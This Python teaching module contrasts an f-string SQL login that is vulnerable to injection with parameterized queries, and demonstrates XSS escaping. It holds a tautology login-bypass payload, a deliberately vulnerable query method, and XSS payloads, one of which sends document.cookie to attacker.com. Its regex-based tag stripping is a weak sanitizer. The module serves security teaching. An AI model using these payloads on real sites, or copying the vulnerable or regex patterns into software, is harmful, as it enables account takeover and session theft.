r"""
Application Security: SQL Injection Exploitation vs Parameterization & XSS Sanitization
=======================================================================================
Description: Empirical demonstration of OWASP Top 10 Injection vulnerabilities.
             Contrasts vulnerable dynamic string interpolation with secure parameterized
             SQL queries across SQLite databases, and demonstrates contextual HTML entity
             encoding and input sanitization to eliminate Cross-Site Scripting (XSS).
Enterprise Mapping:
- SQL Injection (SQLi): Historically the #1 web application vulnerability. Comparing naive
  string interpolation (vulnerable in PHP `mysql_query`, Node.js raw query strings) against
  parameterized prepared statements (PHP PDO `:param` / `?` and Node.js `pg.query($1)`).
- Cross-Site Scripting (XSS): Preventing Stored and Reflected XSS by contextual HTML encoding
  (`html.escape()`), mirroring PHP `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')` and
  automatic JSX / template escaping in React/Angular.

Official Documentation References:
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Cross-Site Scripting (XSS) Prevention: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- Python SQLite3 Parameterization: https://docs.python.org/3/library/sqlite3.html#how-to-use-placeholders-to-bind-values-in-sql-queries
- Python HTML Module (html.escape): https://docs.python.org/3/library/html.html
"""

from __future__ import annotations

import html
import re
import sqlite3
from typing import Any, Final, NamedTuple


class UserAuthenticationRecord(NamedTuple):
    user_id: int
    username: str
    role: str


# ==============================================================================
# 1. SQL Injection: Vulnerable vs Parameterized Query Engines
# ==============================================================================
class DatabaseAuthEngine:
    """Demonstrates vulnerable vs secure database query patterns."""

    def __init__(self) -> None:
        # Maintain in-memory database with isolated seed data
        self.conn: sqlite3.Connection = sqlite3.connect(":memory:")
        self.conn.row_factory = sqlite3.Row
        self._seed_database()

    def _seed_database(self) -> None:
        """Initialize mock accounts table."""
        with self.conn:
            self.conn.execute("""
            CREATE TABLE accounts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL UNIQUE,
                password_hash TEXT NOT NULL,
                role TEXT NOT NULL
            );
            """)
            self.conn.executemany(
                "INSERT INTO accounts (username, password_hash, role) VALUES (?, ?, ?);",
                [
                    ("admin", "hash_admin_secret_998", "SUPERADMIN"),
                    ("alice", "hash_alice_secret_123", "DEVELOPER"),
                    ("bob", "hash_bob_secret_456", "ACCOUNTANT"),
                ],
            )

    # --------------------------------------------------------------------------
    # VULNERABLE PATTERN (DO NOT USE IN PRODUCTION)
    # --------------------------------------------------------------------------
    def vulnerable_login(self, username_input: str, password_input: str) -> list[sqlite3.Row]:
        """
        ANTI-PATTERN: Dynamic string concatenation / f-string formatting.
        Vulnerable to classic tautology injection (e.g. ' OR '1'='1).
        Equivalent to legacy PHP: "SELECT * FROM accounts WHERE user='$user'"
        """
        cursor = self.conn.cursor()
        # DANGEROUS: Untrusted user input directly concatenated into SQL statement
        query = (
            f"SELECT id, username, role FROM accounts "
            f"WHERE username = '{username_input}' AND password_hash = '{password_input}';"
        )
        cursor.execute(query)
        return cursor.fetchall()

    # --------------------------------------------------------------------------
    # SECURE PATTERN (PRODUCTION STANDARD)
    # --------------------------------------------------------------------------
    def secure_parameterized_login(self, username_input: str, password_input: str) -> list[sqlite3.Row]:
        """
        PRODUCTION PATTERN: Parameterized prepared statements using placeholders ('?').
        Untrusted parameters are sent separately from the query syntax,
        rendering SQL injection mathematically impossible.
        """
        cursor = self.conn.cursor()
        query = (
            "SELECT id, username, role FROM accounts "
            "WHERE username = ? AND password_hash = ?;"
        )
        # Parameters passed as tuple to database driver
        cursor.execute(query, (username_input, password_input))
        return cursor.fetchall()


# ==============================================================================
# 2. XSS Input Sanitization & HTML Entity Encoding
# ==============================================================================
class XssSanitizationService:
    """
    Sanitizes untrusted user inputs before reflection in web presentations.
    Prevents Reflected and Stored Cross-Site Scripting (XSS).
    """

    # Dangerous URI schemes for href attributes
    DANGEROUS_SCHEMES: Final[tuple[str, ...]] = ("javascript:", "data:", "vbscript:")

    @staticmethod
    def escape_html_context(raw_text: str) -> str:
        """
        Converts dangerous characters into their corresponding HTML entities:
          & -> &amp;
          < -> &lt;
          > -> &gt;
          " -> &quot;
          ' -> &#x27;
        Direct equivalent to PHP `htmlspecialchars($str, ENT_QUOTES, 'UTF-8')`.
        """
        return html.escape(raw_text, quote=True)

    @classmethod
    def sanitize_hyperlink(cls, raw_url: str) -> str:
        """
        Sanitize URLs destined for HTML `<a href="...">` attributes.
        Neutralizes `javascript:alert(1)` payloads.
        """
        clean_url = raw_url.strip()
        lower_url = clean_url.lower()

        for scheme in cls.DANGEROUS_SCHEMES:
            if lower_url.startswith(scheme):
                return "#blocked_dangerous_scheme"

        # HTML-encode safe URL
        return cls.escape_html_context(clean_url)

    @staticmethod
    def strip_script_tags(raw_html: str) -> str:
        """Strip executable <script> tags and inline DOM event attributes."""
        # 1. Strip script tags and content
        no_scripts = re.sub(r"(?is)<script.*?>.*?</script>", "", raw_html)
        # 2. Strip inline event handlers (e.g. onerror=, onclick=)
        sanitized = re.sub(r"(?i)\s+on[a-z]+\s*=\s*([\"'][^\"']*[\"']|[^\s>]+)", "", no_scripts)
        return sanitized


# ==============================================================================
# Verification & Self-Executing Diagnostic Suite
# ==============================================================================
def main() -> None:
    print("=" * 70)
    print(" LEVEL 6: 03_SQL_INJECTION_AND_INPUT_SANITIZATION - ENTERPRISE RUNTIME DEMO")
    print("=" * 70)

    # --------------------------------------------------------------------------
    # 1. SQL Injection: Attack Simulation
    # --------------------------------------------------------------------------
    print("\n--- 1. SQL Injection Exploitation vs Parameterized Defense ---")
    db = DatabaseAuthEngine()

    # Legitimate login
    legit_rows = db.vulnerable_login("alice", "hash_alice_secret_123")
    assert len(legit_rows) == 1
    print(f"  Legitimate Login: Authenticated as '{legit_rows[0]['username']}'")

    # ATTACK PAYLOAD: SQL Tautology Injection
    # Injects: ' OR '1'='1' -- which renders the WHERE clause always true
    attack_payload_user = "admin' OR '1'='1"
    attack_payload_pass = "irrelevant_password"

    print(f"\n  [ATTACK SIMULATION] Injecting SQL Payload:\n    Username: \"{attack_payload_user}\"")

    # A. Execute against Vulnerable Endpoint
    compromised_rows = db.vulnerable_login(attack_payload_user, attack_payload_pass)
    print(f"  [VULNERABLE ENDPOINT RESULT] Bypassed authentication! Returned {len(compromised_rows)} accounts:")
    for row in compromised_rows:
        print(f"    - ID: {row['id']} | User: {row['username']} | Role: {row['role']}")
    # The vulnerability allowed the attacker to log in as ADMIN without knowing password!
    assert any(r["role"] == "SUPERADMIN" for r in compromised_rows)

    # B. Execute against Secure Parameterized Endpoint
    defended_rows = db.secure_parameterized_login(attack_payload_user, attack_payload_pass)
    print(f"\n  [SECURE ENDPOINT RESULT] Rows returned by parameterized query: {len(defended_rows)}")
    assert len(defended_rows) == 0
    print("  [SECURITY PASS] Parameterized query successfully treated the injection as a literal string.")

    # --------------------------------------------------------------------------
    # 2. Cross-Site Scripting (XSS) Sanitization
    # --------------------------------------------------------------------------
    print("\n--- 2. XSS Input Sanitization & Entity Encoding ---")
    xss_payload_1 = "<script>alert('Stealing Session Cookie: ' + document.cookie)</script>"
    xss_payload_2 = "<img src='invalid.jpg' onerror='fetch(\"https://attacker.com?c=\" + document.cookie)'>"
    xss_payload_3 = "javascript:stealCredentials()"

    # Test HTML escaping
    escaped_1 = XssSanitizationService.escape_html_context(xss_payload_1)
    print(f"  Raw XSS Payload 1:\n    {xss_payload_1}")
    print(f"  Escaped HTML Entity Output:\n    {escaped_1}")
    assert "<script>" not in escaped_1
    assert "&lt;script&gt;" in escaped_1

    # Test Inline Event Handler Stripping
    stripped_2 = XssSanitizationService.strip_script_tags(xss_payload_2)
    print(f"\n  Raw XSS Payload 2:\n    {xss_payload_2}")
    print(f"  Stripped DOM Event Output:\n    {stripped_2}")
    assert "onerror=" not in stripped_2

    # Test Malicious Hyperlink Neutralization
    sanitized_url = XssSanitizationService.sanitize_hyperlink(xss_payload_3)
    print(f"\n  Raw Dangerous URL: '{xss_payload_3}'")
    print(f"  Sanitized Hyperlink Target: '{sanitized_url}'")
    assert sanitized_url == "#blocked_dangerous_scheme"

    print("\n" + "=" * 70)
    print("[ALL CHECKS PASSED] 03_sql_injection_and_input_sanitization module executed cleanly.")
    print("=" * 70)


if __name__ == "__main__":
    main()
